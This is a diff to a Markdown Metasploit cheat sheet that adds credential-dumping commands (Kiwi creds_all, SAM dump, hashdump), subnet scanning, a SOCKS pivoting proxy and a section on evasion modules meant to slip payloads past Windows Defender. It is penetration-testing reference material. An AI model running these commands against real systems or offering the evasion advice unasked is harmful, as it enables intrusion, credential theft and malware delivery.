@@ -145,7 +145,9 @@ meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
 meterpreter > screenshot
 meterpreter > webcam_list; webcam_snap  # if supported by the payload
 meterpreter > hashdump    # requires appropriate privileges
-meterpreter > load kiwi   # load Kiwi (similar to mimikatz) when available
+meterpreter > load kiwi          # load Kiwi (Mimikatz port for Meterpreter)
+meterpreter > creds_all          # dump all credentials via Kiwi
+meterpreter > lsa_dump_sam       # dump SAM database
 ```
 
 - Note: Some post-exploitation extensions require additional modules or privileges.
@@ -173,18 +175,40 @@ meterpreter > background     # background the current session
 - Initialize the database (if using DB features):
 
 ```bash
-# on some installations:
-$ msfdb init
-# or configure PostgreSQL and use db_connect per the docs
-msf6 > db_status
-msf6 > workspace -a lab1
-msf6 > workspace lab1
+$ msfdb init          # initialize PostgreSQL backend
+msf6 > db_status      # verify connection
+```
+
+- Workspaces — isolate engagements:
+
+```bash
+msf6 > workspace                  # list workspaces
+msf6 > workspace -a engagement1   # create and switch
+msf6 > workspace engagement1      # switch
+msf6 > workspace -d old           # delete
+```
+
+- Hosts and services (populated after scans or imports):
+
+```bash
+msf6 > hosts                      # list discovered hosts
+msf6 > services                   # list open services
+msf6 > vulns                      # list identified vulnerabilities
+msf6 > loot                       # list captured loot (credentials, files)
+msf6 > creds                      # list captured credentials
 ```
 
 - Import Nmap results:
 
 ```bash
 msf6 > db_import nmap.xml
+msf6 > db_nmap -sV 192.168.1.0/24  # run Nmap directly and store results
+```
+
+- Suggest exploits based on database findings (Metasploit 6):
+
+```bash
+msf6 > analyze                    # suggest modules for hosts/services in the DB
 ```
 
 - Resource scripts for automation:
@@ -216,16 +240,35 @@ msf6 > set DOMAIN example.local
 msf6 > run
 ```
 
-- Simple servers (FTP / SOCKS):
+- Simple servers (FTP / SOCKS proxy):
 
 ```bash
 msf6 > use auxiliary/server/ftp
 msf6 > set FTPROOT /tmp/ftproot
 msf6 > run
 
-msf6 > use auxiliary/server/socks4
-msf6 > run
+# SOCKS5 proxy (use with proxychains for pivoting)
+msf6 > use auxiliary/server/socks_proxy
+msf6 > set SRVPORT 1080
+msf6 > set VERSION 5
+msf6 > run -j
 ```
+
+---
+
+## Evasion modules (Metasploit 6)
+
+Metasploit 6 introduced a dedicated `evasion` module category for generating payloads designed to reduce detection by security products.
+
+```bash
+msf6 > search type:evasion
+msf6 > use evasion/windows/windows_defender_exe
+msf6 exploit(...) > show options
+msf6 exploit(...) > run
+```
+
+- Evasion modules are not a guaranteed bypass — always test against the target environment.
+- For advanced evasion, consider combining with custom loaders, obfuscation, or dedicated C2 frameworks.
 
 ---
 
@@ -259,8 +302,10 @@ show missing
 exploit -j
 jobs -l
 sessions -l
-session -i <id>
+sessions -i <id>
 db_status
+hosts / services / vulns / loot / creds
+analyze
 workspace -a <name>
 msfconsole -r script.rc
 msfvenom -p <payload> LHOST=... LPORT=... -f exe > out.exe
@@ -268,18 +313,12 @@ msfvenom -p <payload> LHOST=... LPORT=... -f exe > out.exe
 
 ---
 
-## Changes made from the original
-- Added a legal/ethics notice.
-- Expanded msfvenom section with `-a`, `--platform`, `-x`, `-b` and a warning about encoders.
-- Added `info`, `show missing`, `setg`, `workspace`, `db_status`, `msfdb`, and resource scripts (`msfconsole -r`).
-- Clarified multi/handler usage and suggested `ExitOnSession false` to keep handlers alive.
-- Improved formatting and consistency for GitHub Pages readability.
-
----
-
 ## Further reading
-- Metasploit Framework documentation and release notes
-- msfvenom documentation
-- Metasploit module development guides
+
+- [Metasploit Framework Documentation](https://docs.metasploit.com/) — official docs, module development guides, and API reference
+- [Metasploit Release Notes](https://github.com/rapid7/metasploit-framework/releases) — new modules, fixes, and breaking changes
+- [msfvenom Payload Cheatsheet (OffSec)](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) — extended payload examples
+- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — free in-depth course by Offensive Security
+- [MITRE ATT&CK — Metasploit](https://attack.mitre.org/software/S0521/) — technique mapping for detection and defense
 
 ---
